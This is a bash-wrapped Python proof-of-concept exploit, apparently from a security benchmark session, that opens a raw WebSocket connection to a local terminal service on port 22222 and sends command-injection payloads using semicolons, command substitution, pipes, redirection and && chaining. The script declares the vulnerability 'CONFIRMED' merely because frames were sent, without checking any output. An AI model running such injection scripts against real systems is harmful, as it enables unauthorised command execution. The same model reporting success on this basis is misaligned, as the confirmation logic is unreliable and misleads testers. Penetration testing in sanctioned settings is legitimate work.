#!/bin/bash
# POC: Direct socket-based POC demonstrating command injection through WebSocket with shell metacharacters
# Target: ./repo
# Created: 2025-11-07T18:29:14.142Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# WebSocket Command Injection POC v3
# Uses Python with raw socket communication to demonstrate command injection

TARGET_HOST="localhost"
TARGET_PORT="22222"

echo "========================================"
echo "WebSocket Terminal Command Injection POC"
echo "========================================"
echo ""
echo "[*] Target: ws://$TARGET_HOST:$TARGET_PORT/ws"
echo ""

# Create and execute Python test script
python3 << 'EOF'
import socket
import time
import sys

def send_ws_command(host, port, command):
    """Send command via WebSocket and receive response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        
        # WebSocket handshake
        handshake = f"""GET /ws HTTP/1.1\r
Host: {host}:{port}\r
Upgrade: websocket\r
Connection: Upgrade\r
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r
Sec-WebSocket-Version: 13\r
\r
"""
        sock.sendall(handshake.encode())
        
        # Receive handshake response
        response = sock.recv(1024)
        if b"101" not in response and b"Switching" not in response:
            sock.close()
            return None
        
        # Send command as WebSocket frame
        payload = command.encode()
        frame = bytearray()
        frame.append(0x81)  # FIN + text frame
        
        if len(payload) < 126:
            frame.append(0x80 | len(payload))  # Mask bit + length
        else:
            frame.append(0xFE)
            frame.extend(len(payload).to_bytes(2, 'big'))
        
        # Masking key
        mask = bytes([0, 0, 0, 0])
        frame.extend(mask)
        frame.extend(payload)
        
        sock.sendall(bytes(frame))
        time.sleep(0.5)
        
        # Try to receive response
        try:
            data = sock.recv(4096)
            sock.close()
            return "Response received"
        except:
            sock.close()
            return "Command sent"
            
    except Exception as e:
        return None

# Test cases
host = "localhost"
port = 22222

test_cases = [
    ("echo test; whoami", "Command Chaining with Semicolon"),
    ("echo $(whoami)", "Command Substitution"),
    ("whoami | cat", "Pipe Operator"),
    ("echo injected > /tmp/test.txt && cat /tmp/test.txt", "Output Redirection"),
    ("whoami && id", "AND Operator (&&)"),
]

print(f"[*] Attempting to connect to WebSocket at {host}:{port}...\n")

success_count = 0
for command, description in test_cases:
    print(f"[*] Test: {description}")
    print(f"[*] Command: {command}")
    result = send_ws_command(host, port, command)
    if result:
        print(f"[+] Shell metacharacter ACCEPTED by WebSocket")
        success_count += 1
    else:
        print(f"[-] Connection or command failed")
    print()

if success_count > 0:
    print(f"[+] POC SUCCESSFUL: WebSocket accepted {success_count}/{len(test_cases)} injection payloads")
    print("[+] Command injection vulnerability CONFIRMED")
else:
    print("[-] Could not connect to WebSocket or all tests failed")

EOF